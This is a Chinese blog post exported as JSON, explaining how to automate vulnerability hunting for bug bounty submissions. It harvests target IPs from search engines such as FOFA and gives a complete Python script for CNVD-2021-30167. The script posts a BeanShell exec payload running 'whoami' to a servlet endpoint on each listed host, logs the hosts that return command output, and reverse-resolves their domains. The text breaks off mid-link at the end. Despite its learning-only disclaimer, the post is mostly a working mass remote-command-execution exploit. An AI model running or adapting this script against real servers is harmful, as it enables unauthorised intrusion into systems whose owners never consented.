{"title":"自动化漏洞测试的小尝试","uid":"e6b5962f5d28325c61e84557aeb38a78","slug":"自动化漏洞测试的小尝试","date":"2021-07-26T06:59:03.000Z","updated":"2021-07-26T09:00:10.402Z","comments":true,"path":"api/articles/自动化漏洞测试的小尝试.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210721205645.png","content":"<p>最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利用自动化脚本去批量攻击获取flag，然后批量上交，这方面来说和下面的自动化脚本时异曲同工之妙啊。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>声明：本文中的自动化脚本仅供学习和安全研究，禁止利用该工具非法攻击他人网站。本人不承担任何后果。</p></blockquote>\n<h1 id=\"挖掘事件型漏洞的前期准备\"><a href=\"#挖掘事件型漏洞的前期准备\" class=\"headerlink\" title=\"挖掘事件型漏洞的前期准备\"></a>挖掘事件型漏洞的前期准备</h1><p>对于原创型漏洞我们需要做的更多是代码审计，而对于挖掘事件型漏洞那就需要我们提前准备一些工具或收集一些信息了。</p>\n<ol>\n<li>收集一些0Day或者NDay漏洞的EXP和POC</li>\n<li>合理利用网络安全搜索引擎来收集信息，例如FOFA、360网络空间探测平台、ZoomEyes等等</li>\n</ol>\n<h2 id=\"收集EXP和POC\"><a href=\"#收集EXP和POC\" class=\"headerlink\" title=\"收集EXP和POC\"></a>收集EXP和POC</h2><p>关于EXP和POC的收集，这个就需要大家经常关注一些漏洞信息平台了，这样可以帮助我们去寻找一些新的漏洞，更是方便寻找漏洞编号，以便于我们寻找EXP和POC。</p>\n<p>这里说几个我知道的漏洞信息共享平台：CNNVD国家信息安全漏洞库、安全客漏洞平台、seebug平台、美国国家信息安全漏洞库、国家工控漏洞库</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>CNNVD：<a href=\"http://www.cnnvd.org.cn/\">http://www.cnnvd.org.cn/</a></p>\n<p>安全客：<a href=\"https://www.anquanke.com/vul\">https://www.anquanke.com/vul</a></p>\n<p>seebug：<a href=\"https://www.seebug.org/\">https://www.seebug.org/</a></p>\n<p>美国信安库：<a href=\"https://nvd.nist.gov/\">https://nvd.nist.gov/</a></p>\n<p>国家工控漏洞库：<a href=\"http://ics.cnvd.org.cn/\">http://ics.cnvd.org.cn/</a></p></blockquote>\n<p>以上这些是漏洞库信息，找到一个漏洞，并且想要深入了解一下其如何利用，这时候就要多逛，攻防社区、安全媒体等，例如FREEBUF、安全客、嘶吼、奇安信攻防社区、先知社区等了</p>\n<p>最后POC和EXP，通过上面的安全媒体和攻防社区，大多数的POC和EXP我们都可以获取，但是还是无法获取到POC或者EXP，那么就完全可以去Github上输入相应的漏洞编号进行搜索，很有可能是可以找到相应的EXP和POC的。</p>\n<h2 id=\"网络空间安全搜索引擎利用\"><a href=\"#网络空间安全搜索引擎利用\" class=\"headerlink\" title=\"网络空间安全搜索引擎利用\"></a>网络空间安全搜索引擎利用</h2><p>对于前面的EXP和POC都准备好了，那么就需要来找一下相应的目标了，这个时候就可以考虑去使用网络空间安全搜索引擎来查找运行目标组件的设备了。</p>\n<p>不同的网络安全搜索引擎语法略有不同，大家可以自行到相应网站了解，这里我主要用FOFA、ZoomEyes和360空间探测。使用相应语法可以搜索到运行目标组件的设备，这个时候就可以批量导出IP地址到本地，或者使用一些手法利用console来导出IP地址。这样就可以获得一个目标IP列表了，再结合我们的自动化脚本实现批量扫描。</p>\n<h1 id=\"自动化脚本开发思路\"><a href=\"#自动化脚本开发思路\" class=\"headerlink\" title=\"自动化脚本开发思路\"></a>自动化脚本开发思路</h1><p>首先自动化脚本要实现的目的是什么？当然是要代替人去进行漏洞验证，所以我们需要去遍历IP URL列表，由脚本去逐一验证漏洞能否利用。</p>\n<p>其次自动化脚本验证后，我们想要获得什么？当然是让脚本告诉我们哪些设备存在漏洞，以及漏洞地址。那么我们就可以由脚本生成一份漏洞URL列表给我们。</p>\n<p>如果使用过FOFA等引擎就知道，我们一直访问的都是IP地址，而非使用域名进行访问，而提交漏洞最好还是要有一个域名，这也有利于找到服务器所属厂商。所以脚本还提供一个IP反查到域名的功能，并且在生成一份IP反查结果列表给我们。</p>\n<p><img src=\"C:\\Users\\A1andNS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210726153421840.png\" alt=\"image-20210726153421840\"></p>\n<p>但是这还不够，导出IP地址时，我们并不知道IP是否时之前已经验证过的了，所以还应该在漏洞验证模块之前加入一个过滤器，滤除重复项目，所以需要在建立一个已扫描IP URL列表，在开始漏洞验证前去除重复IP，提高工作效率。</p>\n<h1 id=\"实施案例-CNVD-2021-30167\"><a href=\"#实施案例-CNVD-2021-30167\" class=\"headerlink\" title=\"实施案例-CNVD-2021-30167\"></a>实施案例-CNVD-2021-30167</h1><p>啥也不说，show you my code：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># coding='utf-8'</span>\n<span class=\"token comment\"># author: A1andNS</span>\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">from</span> bs4 <span class=\"token keyword\">import</span> BeautifulSoup\n<span class=\"token keyword\">import</span> time\n\nvul_url <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vul_url.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span>\nip_reverse_result <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ip_reverse_result.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_ip_finished</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f2 <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ip_finish.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n    lines <span class=\"token operator\">=</span> f2<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ip_finish_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span>\n        line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        ip_finish_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span>\n    f2<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ip_finish_list\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_ip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ip.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ip格式为 http://192.168.2.2:8090/</span>\n    lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ip_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span>\n        line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#pattern = re.compile(r':[0-9]+')</span>\n        <span class=\"token comment\">#if pattern.search(line):</span>\n        <span class=\"token comment\">#line = line.replace(\"https\", \"http\")</span>\n        ip_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ip_list\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">poc</span><span class=\"token punctuation\">(</span>ips<span class=\"token punctuation\">,</span>ipfs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string\">\"whoami\"</span>  <span class=\"token comment\"># command</span>\n    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>\n    <span class=\"token punctuation\">&#125;</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"bsh.script\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'exec(\"'</span><span class=\"token operator\">+</span>cmd<span class=\"token operator\">+</span><span class=\"token string\">'\")'</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> ip <span class=\"token keyword\">in</span> ips<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ip <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> ipfs<span class=\"token punctuation\">:</span>\n            url <span class=\"token operator\">=</span> ip <span class=\"token operator\">+</span> <span class=\"token string\">\"servlet/~ic/bsh.servlet.BshServlet\"</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token string\">\"抱歉，您请求的页面出错啦！\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" 失败\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">pass</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    html <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">,</span> <span class=\"token string\">\"html.parser\"</span><span class=\"token punctuation\">)</span>\n                    pre <span class=\"token operator\">=</span> html<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">\"pre\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">if</span> pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span>pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        vul_url<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span>pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n                url <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"https\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"http\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token string\">\"抱歉，您请求的页面出错啦！\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" 失败\"</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">pass</span>\n                    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                        html <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">,</span> <span class=\"token string\">\"html.parser\"</span><span class=\"token punctuation\">)</span>\n                        pre <span class=\"token operator\">=</span> html<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">\"pre\"</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">if</span> pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span>pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                            vul_url<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span>pre<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"无法访问\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">pass</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\" 已测试的重复项\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">pass</span>\n    vul_url<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">search_ip</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pattern <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;'</span><span class=\"token punctuation\">)</span>\n    ip <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> ip<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_ip_reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vul_url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n    lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span>\n        line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        line_ls <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n        url <span class=\"token operator\">=</span> line_ls<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        ip <span class=\"token operator\">=</span> search_ip<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> ip <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span>\n            aizhan_reverse<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span>\n    ip_reverse_result<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">aizhan_reverse</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    result <span class=\"token operator\">=</span> ip <span class=\"token operator\">+</span> <span class=\"token string\">\" =>\"</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://dns.aizhan.com/\"</span> <span class=\"token operator\">+</span> ip <span class=\"token operator\">+</span> <span class=\"token string\">\"/\"</span>\n    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># print(url)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n        soup <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">,</span><span class=\"token string\">\"html.parser\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(soup)</span>\n        td <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"td\"</span><span class=\"token punctuation\">,</span> attrs<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"class\"</span> <span class=\"token punctuation\">:</span><span class=\"token string\">\"domain\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> td<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>td<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            a <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>a\n            result <span class=\"token operator\">+=</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token string\">'href'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n        ip_reverse_result<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>result<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\" 发生错误\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.8684.cn/ip\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    ip_ls <span class=\"token operator\">=</span> get_ip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ip_fls <span class=\"token operator\">=</span> get_ip_finished<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    poc<span class=\"token punctuation\">(</span>ip_ls<span class=\"token punctuation\">,</span>ip_fls<span class=\"token punctuation\">)</span>\n    get_ip_reverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(ip_fls)</span>\n    <span class=\"token comment\"># test()</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这就是我根据上面所写的开发思路的开发结果，一个自动化漏洞验证，并且IP反查域名的脚本，他的出现确实提高了不少效率啊。</p>\n<p>执行结果如下：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210726164106.png\" alt=\"image-20210726163713961\"></p>\n<p>这个脚本目前我已经放在我的一个github仓库上了，以后应该还会有其他的脚本被加入进去。</p>\n<p>仓库地址：<a 